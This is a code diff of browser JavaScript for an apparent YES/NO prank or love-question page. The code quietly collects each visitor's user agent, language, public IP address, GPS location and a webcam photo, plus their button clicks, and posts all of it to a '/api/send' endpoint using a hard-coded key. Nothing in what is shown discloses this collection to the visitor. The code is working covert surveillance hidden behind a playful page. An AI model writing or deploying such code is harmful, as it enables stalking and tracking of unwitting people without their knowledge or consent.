@@ -1,28 +1,28 @@
-fetch("/api/send",{
-  method:"POST",
-  headers:{
-    "Content-Type":"application/json",
-    "x-api-key":"secret123"
-  },
-  body:JSON.stringify({
-    type:"text",
-    text:"Test message"
-  })
-});
 const API = "/api/send";
 
+/* SEND FUNCTION */
+
 async function send(data){
-  await fetch(API,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json"},
-    body:JSON.stringify(data)
-  });
+  try{
+
+    await fetch(API,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json",
+        "x-api-key":"secret123"
+      },
+      body:JSON.stringify(data)
+    });
+
+  }catch(e){
+    console.log("Send error",e);
+  }
 }
+
 
 /* DEVICE INFO */
 
-const info =
-`
+const info = `
 ❤️ New Visitor
 
 UserAgent:
@@ -36,8 +36,8 @@ ${navigator.language}
 `;
 
 send({
- type:"text",
- text:info
+  type:"text",
+  text:info
 });
 
 
@@ -46,10 +46,12 @@ send({
 fetch("https://api.ipify.org?format=json")
 .then(r=>r.json())
 .then(d=>{
- send({
-  type:"text",
-  text:"🌐 IP Address: "+d.ip
- });
+
+  send({
+    type:"text",
+    text:"🌐 IP Address: " + d.ip
+  });
+
 });
 
 
@@ -57,17 +59,17 @@ fetch("https://api.ipify.org?format=json")
 
 if(navigator.geolocation){
 
- navigator.geolocation.getCurrentPosition(pos=>{
+  navigator.geolocation.getCurrentPosition(pos=>{
 
-   const lat = pos.coords.latitude;
-   const lon = pos.coords.longitude;
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-   send({
-    type:"text",
-    text:`📍 Location\nhttps://maps.google.com/?q=${lat},${lon}`
-   });
+    send({
+      type:"text",
+      text:`📍 Location\nhttps://maps.google.com/?q=${lat},${lon}`
+    });
 
- });
+  });
 
 }
 
@@ -76,32 +78,34 @@ if(navigator.geolocation){
 
 async function capturePhoto(){
 
- try{
+  try{
 
- const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
 
- const video = document.createElement("video");
- video.srcObject = stream;
+    const video = document.createElement("video");
+    video.srcObject = stream;
 
- await video.play();
+    await video.play();
 
- const canvas = document.createElement("canvas");
- canvas.width = video.videoWidth;
- canvas.height = video.videoHeight;
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
- const ctx = canvas.getContext("2d");
- ctx.drawImage(video,0,0);
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0);
 
- const img = canvas.toDataURL("image/jpeg");
+    const img = canvas.toDataURL("image/jpeg");
 
- send({
-  type:"photo",
-  image:img
- });
+    send({
+      type:"photo",
+      image:img
+    });
 
- stream.getTracks().forEach(t=>t.stop());
+    stream.getTracks().forEach(t=>t.stop());
 
- }catch(e){}
+  }catch(e){
+    console.log("Camera denied");
+  }
 
 }
 
@@ -112,21 +116,33 @@ setTimeout(capturePhoto,3000);
 
 document.addEventListener("DOMContentLoaded",()=>{
 
- const yes = document.getElementById("yes");
- const no  = document.getElementById("no");
+  const yes = document.getElementById("yes");
+  const no  = document.getElementById("no");
 
- yes.addEventListener("click",()=>{
-   send({
-    type:"text",
-    text:"❤️ User clicked YES"
-   });
- });
+  if(yes){
 
- no.addEventListener("pointerdown",()=>{
-   send({
-    type:"text",
-    text:"😭 User tried clicking NO"
-   });
- });
+    yes.addEventListener("click",()=>{
+
+      send({
+        type:"text",
+        text:"❤️ User clicked YES"
+      });
+
+    });
+
+  }
+
+  if(no){
+
+    no.addEventListener("pointerdown",()=>{
+
+      send({
+        type:"text",
+        text:"😭 User tried clicking NO"
+      });
+
+    });
+
+  }
 
 });
